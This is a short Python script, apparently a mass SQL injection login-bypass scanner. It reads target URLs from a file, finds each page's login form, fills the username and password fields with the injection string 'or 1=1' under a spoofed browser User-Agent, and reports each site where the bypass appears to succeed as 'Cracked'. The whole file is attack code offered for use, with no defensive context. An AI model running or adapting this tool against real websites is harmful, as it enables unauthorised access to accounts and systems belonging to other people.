import requests
import mechanize 
from bs4 import BeautifulSoup
br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
headers = { 
  "User-Agent":"Mozilla/5.0 (Windows NT 6.1) AppleWebKit 537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
  }
site_file = open("site.txt", "r")
site = site_file.read().splitlines()
for link in site:
  print(link)
  req = requests.get(link , headers=headers)
  resp = req.text 
  soup = BeautifulSoup(resp , "html5lib")
  for attr in soup.findAll("input"):
    if attr.get("type") == "text":
      usertag = attr.get("name")
    if attr.get("type") == "password":
      password = attr.get("name")
      br.open(link)
      a = ''.join(usertag)
      b = ''.join(password)
      br.select_form(nr= 0)
      br.form[a] = "or 1=1"
      br.form[b] = "or 1=1"
      resp = br.submit()
      if resp.geturl() == link:
          print("")
      else:
          print("Cracked "+link)